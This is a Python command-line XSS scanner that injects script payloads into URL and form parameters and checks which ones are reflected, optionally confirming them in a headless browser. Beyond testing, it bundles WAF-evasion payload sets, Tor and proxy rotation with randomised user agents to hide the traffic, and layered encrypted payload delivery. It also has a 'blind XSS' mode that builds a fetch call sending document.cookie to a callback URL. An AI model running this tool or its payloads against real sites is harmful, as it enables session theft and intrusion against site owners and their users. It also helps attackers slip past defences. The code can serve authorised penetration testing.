#!/usr/bin/env python3
"""
XOMLSX XSS Scanner — polished CLI + engine
Authorized / lab testing only.
"""
from __future__ import annotations

import html as _html
import json
import os
import random
import re
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

import urllib3

try:
    import requests
except ImportError:
    print("[!] requests required: pip install requests")
    sys.exit(1)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── optional packages ────────────────────────────────────────────────────────
try:
    from xsspor import DetectionEngine, ScanConfig, all_payloads  # type: ignore
    HAS_XSSPOR = True
    XSSPOR_ERR = None
except Exception as e:
    HAS_XSSPOR = False
    XSSPOR_ERR = e
    DetectionEngine = ScanConfig = all_payloads = None  # type: ignore

try:
    from xsspor.chain import ChainAdvanced, hash_password, packet_to_d, d_to_packet  # type: ignore
    HAS_CHAIN = True
except Exception:
    HAS_CHAIN = False
    ChainAdvanced = hash_password = packet_to_d = d_to_packet = None  # type: ignore

try:
    from playwright.sync_api import sync_playwright  # type: ignore
    HAS_PLAYWRIGHT = True
except Exception:
    HAS_PLAYWRIGHT = False
    sync_playwright = None  # type: ignore


# ── palette ──────────────────────────────────────────────────────────────────
class C:
    R = "\033[0m"
    B = "\033[1m"
    D = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YEL = "\033[93m"
    CYN = "\033[96m"
    WHT = "\033[97m"
    GLD = "\033[38;2;239;190;112m"
    NEO = "\033[38;2;82;190;255m"
    PRP = "\033[38;2;151;145;235m"
    CRM = "\033[38;2;232;112;125m"
    GRY = "\033[38;2;137;151;171m"
    LIME = "\033[38;2;111;204;166m"


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
]

WAF_SIGS = {
    "cloudflare": [r"cloudflare", r"cf-ray", r"attention required"],
    "akamai": [r"akamai", r"access denied"],
    "aws_waf": [r"aws.?waf", r"request blocked"],
    "modsecurity": [r"mod_security", r"not acceptable"],
    "imperva": [r"imperva", r"incapsula"],
    "sucuri": [r"sucuri"],
}

COMMON_PARAMS = [
    "q", "s", "search", "query", "id", "page", "name", "keyword", "term",
    "redirect", "url", "next", "return", "returnUrl", "callback", "ref",
    "cat", "category", "type", "view", "file", "path", "dir", "folder",
    "user", "username", "email", "msg", "message", "comment", "title",
    "text", "content", "data", "input", "value", "key", "token",
]


# ── UI helpers ───────────────────────────────────────────────────────────────
def clear():
    os.system("cls" if os.name == "nt" else "clear")


def pause():
    try:
        input(f"\n{C.GRY}  [Enter] continue{C.R}")
    except EOFError:
        pass


def box(title: str, rows: List[Tuple[str, str]], width: int = 62) -> None:
    """Render a compact, aligned terminal panel."""
    inner = max(width - 2, 20)
    edge = C.PRP
    print(f"{edge}╭{'─' * inner}╮{C.R}")
    if title:
        label = f"  {C.B}{C.WHT}{title}{C.R}"
        print(f"{edge}│{C.R}{label}{' ' * max(inner - len(title) - 2, 0)}{edge}│{C.R}")
        print(f"{edge}├{'─' * inner}┤{C.R}")
    for key, label in rows:
        plain = f"  {key:<3} {label}"
        clean = re.sub(r"\033\[[0-9;]*m", "", plain)
        print(f"{edge}│{C.R}{plain}{' ' * max(inner - len(clean), 0)}{edge}│{C.R}")
    print(f"{edge}╰{'─' * inner}╯{C.R}")

def prompt(label: str, default: str = "") -> str:
    suf = f" {C.GRY}[{default}]{C.R}" if default else ""
    try:
        v = input(f"{C.NEO}{label}{C.R}{suf}: ").strip()
    except EOFError:
        return default
    return v or default


def yn(label: str, default: bool = False) -> bool:
    d = "y" if default else "n"
    v = prompt(f"{label} (y/n)", d).lower()
    return v.startswith("y")


def banner():
    clear()
    print(f"""{C.RED}{C.B}
▒██   ██▒  ██████   ██████ 
▒▒ █ █ ▒░▒██    ▒ ▒██    ▒ 
░░  █   ░░ ▓██▄   ░ ▓██▄   
 ░ █ █ ▒   ▒   ██▒  ▒   ██▒
▒██▒ ▒██▒▒██████▒▒▒██████▒▒
▒▒ ░ ░▓ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
░░   ░▒ ░░ ░▒  ░ ░░ ░▒  ░ ░
 ░    ░  ░  ░  ░  ░  ░  ░  
 ░    ░        ░        ░  
""")
def status_line(msg: str, kind: str = "info"):
    colors = {"ok": C.GRN, "err": C.CRM, "warn": C.YEL, "info": C.CYN, "hit": C.LIME}
    mark = {"ok": "[+]", "err": "[!]", "warn": "[~]", "info": "[*]", "hit": "[!]"}
    c = colors.get(kind, C.CYN)
    print(f"  {c}{mark.get(kind, '[*]')} {msg}{C.R}")


# ── field / URL helpers ──────────────────────────────────────────────────────
def normalize_url(url: str) -> str:
    url = (url or "").strip()
    if not url:
        return ""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url


def params_from_url(url: str) -> List[str]:
    return list(parse_qs(urlparse(url).query, keep_blank_values=True).keys())


def inject_param(url: str, param: str, value: str) -> str:
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse((p.scheme, p.netloc, p.path, p.params, urlencode(qs, doseq=True), p.fragment))


def ensure_fields(url: str, method: str, data: Optional[Dict[str, str]]) -> Tuple[str, List[str], Dict[str, str]]:
    """
    Guarantee at least one injectable field.
    GET: use query params; if none, append ?q=test
    POST: use provided data; if empty, default {"q": "test"}
    """
    method = method.upper()
    data = dict(data or {})
    if method == "GET":
        fields = params_from_url(url)
        if not fields:
            # auto-seed common probe param
            join = "&" if "?" in url else "?"
            url = url + join + "q=test"
            fields = ["q"]
            status_line("no query params — seeded ?q=test", "warn")
        return url, fields, data
    # POST
    if not data:
        data = {"q": "test"}
        status_line("no POST body — using q=test", "warn")
    return url, list(data.keys()), data


def parse_post_body(raw: str) -> Dict[str, str]:
    raw = (raw or "").strip()
    if not raw:
        return {}
    if raw.startswith("{"):
        try:
            obj = json.loads(raw)
            return {str(k): str(v) for k, v in obj.items()}
        except Exception:
            pass
    out: Dict[str, str] = {}
    for part in raw.split("&"):
        if "=" in part:
            k, v = part.split("=", 1)
            out[k.strip()] = v.strip()
        elif part.strip():
            out[part.strip()] = ""
    return out


# ── payloads ─────────────────────────────────────────────────────────────────
def make_marker() -> str:
    return "mk" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8)) + "mk"


ALERT_MODE = {"mode": "domain", "callback": ""}


def alert_js(marker: str) -> str:
    mode = ALERT_MODE.get("mode", "domain")
    if mode == "unique":
        return f"alert('{marker}')"
    if mode == "cookie":
        return "alert(document.cookie)"
    if mode == "location":
        return "alert(window.location.href)"
    if mode == "callback":
        cb = ALERT_MODE.get("callback") or "https://example.com/xss"
        return f"fetch('{cb}?c='+document.cookie)"
    return "alert(document.domain)"


def base_payloads(marker: str) -> List[Tuple[str, str]]:
    """(tag, payload) — reflection + context coverage."""
    a = alert_js(marker)
    return [
        ("script", f"<script>{a}</script>"),
        ("script-ns", f"<script>{a}</script>".replace("script", "scr\x00ipt") if False else f"<script>{a}</script>"),
        ("img-onerror", f"<img src=x onerror={a}>"),
        ("svg-onload", f"<svg/onload={a}>"),
        ("body-onload", f"<body onload={a}>"),
        ("iframe-srcdoc", f"<iframe srcdoc=\"<script>{a}</script>\">"),
        ("details-ontoggle", f"<details open ontoggle={a}>"),
        ("input-onfocus", f"<input onfocus={a} autofocus>"),
        ("video-onerror", f"<video><source onerror={a}>"),
        ("math-xlink", f"<math><mtext></mtext></math><script>{a}</script>"),
        ("a-javascript", f"<a href=javascript:{a}>x</a>"),
        ("event-quote-break", f"\" onmouseover={a} x=\""),
        ("event-apos-break", f"' onmouseover={a} x='"),
        ("attr-gt-break", f"><script>{a}</script>"),
        ("template-lit", f"<img src=x onerror=`{a}`>"),
        ("svg-anim", f"<svg><animate onbegin={a} attributeName=x dur=1s>"),
        ("object-data", f"<object data=\"javascript:{a}\">"),
        ("marquee", f"<marquee onstart={a}>x</marquee>"),
        ("raw-js", a),
        ("marker-only", marker),
    ]


def bypass_payloads(marker: str) -> List[Tuple[str, str]]:
    """WAF / filter evasion set."""
    a = alert_js(marker)
    payloads = [
        ("case-mix", f"<ScRiPt>{a}</ScRiPt>"),
        ("tag-break", f"<scr<script>ipt>{a}</script>"),
        ("null-in-tag", f"<scr\x00ipt>{a}</script>"),
        ("html-entity", _html.escape(f"<script>{a}</script>").replace("&lt;script&gt;", "<script>") if False else f"&lt;script&gt;{a}&lt;/script&gt;"),
        ("hex-entity", f"&#x3c;script&#x3e;{a}&#x3c;/script&#x3e;"),
        ("dec-entity", f"&#60;script&#62;{a}&#60;/script&#62;"),
        ("js-unicode", f"<script>\\u0061lert(document.domain)</script>"),
        ("js-hex", f"<script>\\x61lert(document.domain)</script>"),
        ("atob", f"<script>eval(atob('{__import__('base64').b64encode(a.encode()).decode()}'))</script>"),
        ("fromcharcode", f"<script>eval(String.fromCharCode({','.join(str(ord(c)) for c in a)}))</script>"),
        ("svg-case", f"<SvG/OnLoAd={a}>"),
        ("img-space", f"<img src=x onerror = {a}>"),
        ("img-slash", f"<img/src=x/onerror={a}>"),
        ("img-nl", f"<img src=x\nonerror={a}>"),
        ("svg-data", f"<svg><script>{a}</script></svg>"),
        ("iframe-js", f"<iframe src=javascript:{a}>"),
        ("object-js", f"<object data=javascript:{a}>"),
        ("embed-js", f"<embed src=javascript:{a}>"),
        ("form-action", f"<form action=javascript:{a}><input type=submit>"),
        ("button-forma", f"<form><button formaction=javascript:{a}>x</button></form>"),
        ("meta-refresh", f"<meta http-equiv=refresh content=\"0;url=javascript:{a}\">"),
        ("link-import", f"<link rel=import href=\"data:text/html,<script>{a}</script>\">"),
        ("double-urlenc", f"%253Cscript%253E{a}%253C%252Fscript%253E"),
        ("plus-space", f"<script>{a}</script>".replace(" ", "+")),
        ("tab-break", f"<script\t>{a}</script>"),
        ("comment-break", f"<script>/*{marker}*/{a}</script>"),
        ("template", f"<template><script>{a}</script></template>"),
        ("math-script", f"<math><script>{a}</script></math>"),
        ("xss-polyglot", f"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/{a}//'>"),
        ("waf-concat", f"<script>window['al'+'ert'](document['dom'+'ain'])</script>"),
    ]
    # clean broken html-entity experiment
    payloads = [(t, p) for t, p in payloads if p]
    return payloads


# ── proxy pool ───────────────────────────────────────────────────────────────
def normalize_proxy(line: str) -> Optional[str]:
    line = (line or "").strip()
    if not line or line.startswith("#"):
        return None
    if "://" not in line:
        line = "http://" + line
    return line


class ProxyPool:
    def __init__(self, proxies: List[str]):
        self.proxies = [p for p in (normalize_proxy(x) for x in proxies) if p]
        self._i = 0
        self._lock = threading.Lock()

    def get(self) -> Optional[str]:
        if not self.proxies:
            return None
        with self._lock:
            p = self.proxies[self._i % len(self.proxies)]
            self._i += 1
            return p

    def get_for(self, _payload: str = "") -> Optional[str]:
        return self.get()

    def __len__(self):
        return len(self.proxies)


def load_proxies_file(path: str) -> List[str]:
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            p = normalize_proxy(line)
            if p:
                out.append(p)
    return out


def ask_proxies() -> ProxyPool:
    if not yn("Use proxies", False):
        return ProxyPool([])
    box("Proxy source", [
        ("1", "Tor  socks5://127.0.0.1:9050"),
        ("2", "File path"),
        ("3", "Paste lines (end with empty line)"),
    ])
    mode = prompt(">>", "2")
    proxies: List[str] = []
    if mode == "1":
        tor = "socks5://127.0.0.1:9050"
        status_line("testing Tor…", "info")
        try:
            r = requests.get(
                "https://check.torproject.org/api/ip",
                proxies={"http": tor, "https": tor},
                timeout=10,
                verify=False,
            )
            data = r.json()
            if data.get("IsTor"):
                status_line(f"Tor OK — {data.get('IP')}", "ok")
                proxies = [tor]
            else:
                status_line("not routed via Tor", "err")
        except Exception as e:
            status_line(f"Tor down: {e}", "err")
    elif mode == "2":
        path = prompt("Proxy file").strip('"').strip("'")
        proxies = load_proxies_file(path)
        status_line(f"loaded {len(proxies)} proxies", "ok" if proxies else "warn")
    else:
        status_line("paste proxies, empty line to finish", "info")
        while True:
            try:
                line = input()
            except EOFError:
                break
            if not line.strip():
                break
            p = normalize_proxy(line)
            if p:
                proxies.append(p)
    return ProxyPool(proxies)


# ── detection helpers ────────────────────────────────────────────────────────
def detect_waf(text: str, headers: Dict[str, str]) -> Optional[str]:
    blob = " ".join(f"{k}:{v}" for k, v in headers.items()) + "\n" + (text or "")[:4000]
    blob_l = blob.lower()
    for name, sigs in WAF_SIGS.items():
        for s in sigs:
            if re.search(s, blob_l):
                return name
    return None


def reflection_kind(body: str, payload: str, marker: str) -> str:
    if not body:
        return "none"
    if payload in body:
        return "verbatim"
    enc = _html.escape(payload)
    if enc in body and payload not in body:
        return "html-encoded"
    if marker and marker in body:
        return "partial-marker"
    # loose: script-ish reflection
    if re.search(re.escape(payload[:12]), body, re.I):
        return "partial"
    return "none"


def detect_context(html: str, marker: str) -> str:
    if not html or not marker or marker not in html:
        return "none"
    idx = html.find(marker)
    window = html[max(0, idx - 80): idx + 80]
    if re.search(r"<script[^>]*>[^<]*" + re.escape(marker), window, re.I):
        return "script"
    if re.search(r"['\"][^'\"]*" + re.escape(marker), window):
        return "attribute"
    if re.search(r"<!--[^>]*" + re.escape(marker), window):
        return "comment"
    if re.search(r"<[^>]+" + re.escape(marker), window):
        return "tag"
    return "html-body"


def severity_for(reflection: str, context: str, confirmed: Optional[bool]) -> str:
    if confirmed:
        return "critical"
    if reflection == "verbatim" and context in ("script", "attribute", "html-body"):
        return "high"
    if reflection in ("verbatim", "partial-marker"):
        return "medium"
    if reflection.startswith("partial"):
        return "low"
    return "info"


# ── browser verify (optional) ────────────────────────────────────────────────
def verify_with_browser(url: str, timeout: float = 8.0) -> Optional[bool]:
    if not HAS_PLAYWRIGHT:
        return None
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            dialogs = []

            def on_dialog(d):
                dialogs.append(d.message)
                d.dismiss()

            page.on("dialog", on_dialog)
            page.goto(url, wait_until="domcontentloaded", timeout=int(timeout * 1000))
            page.wait_for_timeout(800)
            browser.close()
            return bool(dialogs)
    except Exception:
        return None


# ── scanner core ─────────────────────────────────────────────────────────────
@dataclass
class Finding:
    field: str
    tag: str
    payload: str
    reflection: str
    context: str
    severity: str
    status: int
    waf: Optional[str] = None
    confirmed: Optional[bool] = None
    url: str = ""
    evidence: str = ""


class XSSScanner:
    def __init__(
        self,
        url: str,
        method: str = "GET",
        data: Optional[Dict[str, str]] = None,
        fields: Optional[List[str]] = None,
        pool: Optional[ProxyPool] = None,
        threads: int = 6,
        delay: float = 0.15,
        timeout: float = 10.0,
        browser_verify: bool = False,
    ):
        self.url, self.fields, self.data = ensure_fields(url, method, data)
        if fields:
            self.fields = fields
        self.method = method.upper()
        self.pool = pool or ProxyPool([])
        self.threads = max(1, min(32, int(threads)))
        self.delay = max(0.0, float(delay))
        self.timeout = float(timeout)
        self.browser_verify = browser_verify
        self.marker = make_marker()
        self.results: List[Finding] = []
        self.lock = threading.Lock()
        self.stats = {"sent": 0, "errors": 0, "reflected": 0, "verified": 0, "blocked": 0}
        self._last = 0.0
        self._rl = threading.Lock()

    def _rate(self):
        with self._rl:
            now = time.monotonic()
            slot = max(now, self._last + self.delay)
            self._last = slot
        w = slot - time.monotonic()
        if w > 0:
            time.sleep(w)

    def _build(self, field: str, payload: str) -> Tuple[str, Optional[Dict[str, str]]]:
        if self.method == "GET":
            return inject_param(self.url, field, payload), None
        body = dict(self.data)
        body[field] = payload
        return self.url, body

    def _request(self, field: str, payload: str) -> Tuple[Optional[Any], str, Optional[Dict]]:
        self._rate()
        proxy = self.pool.get_for(payload)
        pd = {"http": proxy, "https": proxy} if proxy else None
        target, body = self._build(field, payload)
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        with self.lock:
            self.stats["sent"] += 1
        try:
            if self.method == "GET":
                r = requests.get(
                    target, headers=headers, proxies=pd, timeout=self.timeout,
                    verify=False, allow_redirects=True,
                )
            else:
                r = requests.post(
                    target, data=body, headers=headers, proxies=pd, timeout=self.timeout,
                    verify=False, allow_redirects=True,
                )
            return r, target, body
        except Exception:
            with self.lock:
                self.stats["errors"] += 1
            return None, target, body

    def _analyze(self, field: str, tag: str, payload: str, r, target: str) -> Optional[Finding]:
        if r is None:
            return None
        text = r.text or ""
        headers = {k: v for k, v in r.headers.items()}
        waf = detect_waf(text, headers)
        if waf and r.status_code in (403, 406, 429, 503):
            with self.lock:
                self.stats["blocked"] += 1
        kind = reflection_kind(text, payload, self.marker)
        if kind == "none":
            return None
        with self.lock:
            self.stats["reflected"] += 1
        ctx = detect_context(text, self.marker if self.marker in text else payload[:16])
        confirmed = None
        if self.browser_verify and kind == "verbatim":
            confirmed = verify_with_browser(target)
            if confirmed:
                with self.lock:
                    self.stats["verified"] += 1
        sev = severity_for(kind, ctx, confirmed)
        evidence = ""
        needle = self.marker if self.marker in text else payload[:24]
        idx = text.find(needle)
        if idx >= 0:
            evidence = text[max(0, idx - 40): idx + len(needle) + 40].replace("\n", " ")
        return Finding(
            field=field, tag=tag, payload=payload, reflection=kind, context=ctx,
            severity=sev, status=r.status_code, waf=waf, confirmed=confirmed,
            url=target, evidence=evidence,
        )

    def scan(self, payloads: List[Tuple[str, str]]) -> List[Finding]:
        jobs = [(f, t, p) for f in self.fields for t, p in payloads]
        status_line(
            f"{len(self.fields)} field(s) × {len(payloads)} payload(s) = {len(jobs)} probes  "
            f"threads={self.threads} delay={self.delay}s",
            "info",
        )
        status_line(f"marker={self.marker}", "info")

        def work(item):
            field, tag, payload = item
            # embed marker in payload when unique mode already has it; else append as comment for tracking
            r, target, _ = self._request(field, payload)
            return self._analyze(field, tag, payload, r, target)

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = [ex.submit(work, j) for j in jobs]
            done = 0
            for fut in as_completed(futs):
                done += 1
                if done % max(1, len(jobs) // 10) == 0 or done == len(jobs):
                    print(f"\r  {C.GRY}progress {done}/{len(jobs)}  reflected={self.stats['reflected']}{C.R}   ", end="", flush=True)
                res = fut.result()
                if res:
                    with self.lock:
                        self.results.append(res)
                    self._print_hit(res)
        print()
        return self.results

    def _print_hit(self, f: Finding):
        color = C.CRM if f.severity == "critical" else C.LIME if f.severity == "high" else C.YEL
        conf = ""
        if f.confirmed is True:
            conf = f" {C.GRN}BROWSER-CONFIRMED{C.R}"
        elif f.confirmed is False:
            conf = f" {C.GRY}browser-neg{C.R}"
        waf = f" {C.YEL}WAF={f.waf}{C.R}" if f.waf else ""
        print(
            f"\n  {color}{C.B}[{f.severity.upper()}]{C.R} {f.field} · {f.tag} · {f.reflection}/{f.context}"
            f"{conf}{waf}"
        )
        print(f"    {C.GRY}{f.payload[:100]}{C.R}")
        if f.evidence:
            print(f"    {C.D}…{f.evidence[:90]}…{C.R}")


# ── reports ──────────────────────────────────────────────────────────────────
def reports_dir() -> str:
    if getattr(sys, "frozen", False):
        base = os.path.dirname(sys.executable)
    else:
        base = os.path.dirname(os.path.abspath(__file__))
    d = os.path.join(base, "reports")
    os.makedirs(d, exist_ok=True)
    return d


def save_results(results: List[Finding], url: str, method: str, marker: str) -> str:
    stamp = int(time.time())
    path = os.path.join(reports_dir(), f"xss_{stamp}.json")
    data = {
        "url": url,
        "method": method,
        "marker": marker,
        "ts": datetime.now(timezone.utc).isoformat(),
        "count": len(results),
        "findings": [asdict(r) for r in results],
    }
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    # also a short txt
    tpath = os.path.join(reports_dir(), f"xss_{stamp}.txt")
    with open(tpath, "w", encoding="utf-8") as f:
        f.write(f"XSS report — {url} ({method})\nmarker={marker}\n\n")
        for r in results:
            f.write(f"[{r.severity}] {r.field} {r.tag} {r.reflection}/{r.context}\n  {r.payload}\n  {r.url}\n\n")
    return path


# ── interactive prompts ──────────────────────────────────────────────────────
def ask_alert_type():
    box("Payload PoC style", [
        ("1", f"alert('marker')             {C.GRY}unique tracker{C.R}"),
        ("2", f"alert(document.domain)       {C.GRY}default{C.R}"),
        ("3", f"alert(document.cookie)       {C.GRY}session PoC{C.R}"),
        ("4", f"alert(window.location.href)  {C.GRY}forensic{C.R}"),
        ("5", f"fetch → callback URL         {C.GRY}blind XSS{C.R}"),
    ])
    m = prompt(">>", "2")
    ALERT_MODE["mode"] = {
        "1": "unique", "2": "domain", "3": "cookie", "4": "location", "5": "callback"
    }.get(m, "domain")
    if ALERT_MODE["mode"] == "callback":
        ALERT_MODE["callback"] = prompt("Callback URL", "https://example.com/xss")


def ask_scan_tuning() -> Tuple[int, float, bool]:
    threads = int(prompt("Threads", "6") or "6")
    delay = float(prompt("Delay (sec)", "0.15") or "0.15")
    browser = False
    if HAS_PLAYWRIGHT:
        browser = yn("Confirm with Playwright browser", False)
        if browser:
            status_line("browser verification ON (slower, accurate)", "ok")
        else:
            status_line("reflection-only mode (fast)", "info")
    else:
        status_line("Playwright not installed — reflection only", "warn")
    return max(1, threads), max(0.0, delay), browser


def ask_target(method: str) -> Tuple[str, Dict[str, str]]:
    url = normalize_url(prompt("Target URL"))
    if not url:
        status_line("empty URL", "err")
        return "", {}
    data: Dict[str, str] = {}
    if method.upper() == "POST":
        status_line("POST body — JSON {\"a\":1} or a=1&b=2 (empty = auto q=test)", "info")
        raw = prompt("Body", "")
        data = parse_post_body(raw)
    # optional: let user pick / add fields
    fields_preview = params_from_url(url) if method.upper() == "GET" else list(data.keys())
    if fields_preview:
        status_line("fields: " + ", ".join(fields_preview), "info")
    else:
        status_line("no fields yet — will auto-seed q=test", "warn")
    extra = prompt("Extra field names (comma, optional)", "")
    if extra:
        for name in extra.split(","):
            name = name.strip()
            if not name:
                continue
            if method.upper() == "GET":
                if name not in params_from_url(url):
                    join = "&" if "?" in url else "?"
                    url = url + join + f"{name}=test"
            else:
                data.setdefault(name, "test")
    return url, data


# ── scan runners ─────────────────────────────────────────────────────────────
def run_scan(method: str = "GET", bypass: bool = False):
    banner()
    title = f"{'BYPASS' if bypass else 'NORMAL'} · {method}"
    print(f"  {C.B}{title}{C.R}\n")
    ask_alert_type()
    url, data = ask_target(method)
    if not url:
        pause()
        return
    pool = ask_proxies()
    threads, delay, browser = ask_scan_tuning()

    try:
        eng = XSSScanner(
            url=url, method=method, data=data, pool=pool,
            threads=threads, delay=delay, browser_verify=browser,
        )
    except ValueError as e:
        status_line(str(e), "err")
        pause()
        return

    payloads = bypass_payloads(eng.marker) if bypass else base_payloads(eng.marker)
    status_line(f"payload set: {len(payloads)} ({'bypass' if bypass else 'base'})", "info")
    print()
    results = eng.scan(payloads)
    print()
    status_line(
        f"done — sent={eng.stats['sent']} reflected={eng.stats['reflected']} "
        f"verified={eng.stats['verified']} errors={eng.stats['errors']} blocked={eng.stats['blocked']}",
        "ok",
    )
    if results:
        path = save_results(results, eng.url, method, eng.marker)
        status_line(f"saved {path}", "ok")
        # severity tally
        tall = {}
        for r in results:
            tall[r.severity] = tall.get(r.severity, 0) + 1
        print(f"  {C.GRY}" + " · ".join(f"{k}={v}" for k, v in sorted(tall.items())) + f"{C.R}")
    else:
        status_line("no reflections — try bypass set or different params", "warn")
    pause()


def run_advanced_engine(method: str = "GET"):
    banner()
    print(f"  {C.B}ADVANCED ENGINE (xsspor) · {method}{C.R}\n")
    if not HAS_XSSPOR:
        status_line(f"xsspor unavailable: {XSSPOR_ERR}", "err")
        status_line("falling back to built-in scanner", "warn")
        run_scan(method=method, bypass=True)
        return
    ask_alert_type()
    url, data = ask_target(method)
    if not url:
        pause()
        return
    pool = ask_proxies()
    threads, delay, browser = ask_scan_tuning()
    url, fields, data = ensure_fields(url, method, data)
    status_line(f"fields={fields}", "info")
    try:
        cfg = ScanConfig(
            url=url,
            method=method,
            data=data or None,
            threads=threads,
            delay=delay,
            browser_verify=browser,
            smart_context=True,
        )
        # attach proxy if supported
        engine = DetectionEngine(cfg)
        status_line("xsspor engine running…", "info")
        findings = engine.run() if hasattr(engine, "run") else engine.scan() if hasattr(engine, "scan") else []
        if not findings:
            # fallback probe with built-in if xsspor API differs
            status_line("xsspor returned empty — built-in fallback", "warn")
            run_scan(method=method, bypass=True)
            return
        status_line(f"findings: {len(findings)}", "ok")
        for f in findings:
            print(f"  {C.LIME}{f}{C.R}")
    except Exception as e:
        status_line(f"xsspor error: {e}", "err")
        status_line("built-in fallback", "warn")
        run_scan(method=method, bypass=True)
        return
    pause()


# ── chain (nested encrypted payload builder) ─────────────────────────────────
def chain_self_test():
    banner()
    print(f"  {C.B}CHAIN SELF-TEST{C.R}\n")
    if not HAS_CHAIN:
        status_line("chain module unavailable (need xsspor.chain + cryptography)", "err")
        pause()
        return
    try:
        password = prompt("Password", "lab-pass")
        plain = prompt("Plaintext payload", "<script>alert(1)</script>")
        c = ChainAdvanced(password) if ChainAdvanced else None
        if c is None:
            status_line("ChainAdvanced missing", "err")
            pause()
            return
        # support both APIs
        if hasattr(c, "encode"):
            pkt = c.encode(plain.encode() if isinstance(plain, str) else plain)
            back = c.decode(pkt)
            if isinstance(back, bytes):
                back = back.decode(errors="replace")
            status_line("encode/decode OK" if back == plain else "mismatch", "ok" if back == plain else "err")
            print(f"  {C.GRY}{pkt}{C.R}")
        else:
            status_line("unexpected ChainAdvanced API", "warn")
    except Exception as e:
        status_line(str(e), "err")
    pause()


def send_manual_chain():
    banner()
    print(f"  {C.B}CHAIN MANUAL GET{C.R}\n")
    if not HAS_CHAIN:
        status_line("chain unavailable", "err")
        pause()
        return
    url = normalize_url(prompt("URL (param will be filled)"))
    param = prompt("Param name", "q")
    password = prompt("Password", "lab-pass")
    plain = prompt("Payload", "<script>alert(document.domain)</script>")
    try:
        c = ChainAdvanced(password)
        pkt = c.encode(plain.encode())
        blob = json.dumps(pkt) if isinstance(pkt, dict) else str(pkt)
        target = inject_param(url if params_from_url(url) or True else url + "?q=1", param, blob)
        status_line(f"GET {target[:120]}…", "info")
        r = requests.get(target, timeout=12, verify=False, headers={"User-Agent": random.choice(USER_AGENTS)})
        status_line(f"status={r.status_code} len={len(r.content)}", "ok")
    except Exception as e:
        status_line(str(e), "err")
    pause()


def send_nested_payloads_chain():
    banner()
    print(f"  {C.B}NESTED CHAIN (per-layer passwords){C.R}\n")
    if not HAS_CHAIN:
        status_line("chain unavailable", "err")
        pause()
        return
    n = int(prompt("Layers", "2") or "2")
    layers = []
    for i in range(max(1, min(5, n))):
        pw = prompt(f"Password layer {i+1}", f"pass{i+1}")
        layers.append(pw)
    plain = prompt("Innermost payload", "<script>alert(1)</script>")
    url = normalize_url(prompt("Target URL"))
    param = prompt("Param", "q")
    try:
        data: Any = plain.encode()
        for i, pw in enumerate(reversed(layers)):
            c = ChainAdvanced(pw)
            data = c.encode(data if isinstance(data, bytes) else json.dumps(data).encode())
            status_line(f"layer {len(layers)-i} encoded", "ok")
        blob = json.dumps(data) if isinstance(data, dict) else str(data)
        if not params_from_url(url):
            url = url + ("&" if "?" in url else "?") + f"{param}=x"
        target = inject_param(url, param, blob)
        r = requests.get(target, timeout=12, verify=False)
        status_line(f"sent status={r.status_code}", "ok")
        path = os.path.join(reports_dir(), f"chain_{int(time.time())}.json")
        with open(path, "w", encoding="utf-8") as f:
            json.dump({"url": target, "layers": len(layers), "packet": data}, f, indent=2, default=str)
        status_line(f"saved {path}", "ok")
    except Exception as e:
        status_line(str(e), "err")
    pause()


# ── main menu ────────────────────────────────────────────────────────────────
def run():
    while True:
        banner()
        box("XSS Scanner", [
            ("1", "Scan GET   · normal payloads"),
            ("2", "Scan POST  · normal payloads"),
            ("3", "Scan GET   · bypass / WAF evasion"),
            ("4", "Scan POST  · bypass / WAF evasion"),
            ("5", "Advanced engine GET  (xsspor)"),
            ("6", "Advanced engine POST (xsspor)"),
            ("7", "Nested chain (per-layer passwords)"),
            ("8", "Chain local self-test"),
            ("9", "Chain manual GET"),
            ("0", "Back"),
        ])
        choice = prompt(">>", "0")
        if choice == "0":
            return
        elif choice == "1":
            run_scan("GET", bypass=False)
        elif choice == "2":
            run_scan("POST", bypass=False)
        elif choice == "3":
            run_scan("GET", bypass=True)
        elif choice == "4":
            run_scan("POST", bypass=True)
        elif choice == "5":
            run_advanced_engine("GET")
        elif choice == "6":
            run_advanced_engine("POST")
        elif choice == "7":
            send_nested_payloads_chain()
        elif choice == "8":
            chain_self_test()
        elif choice == "9":
            send_manual_chain()
        else:
            status_line("invalid option", "err")
            time.sleep(0.6)


if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print(f"\n{C.CRM}bye{C.R}")
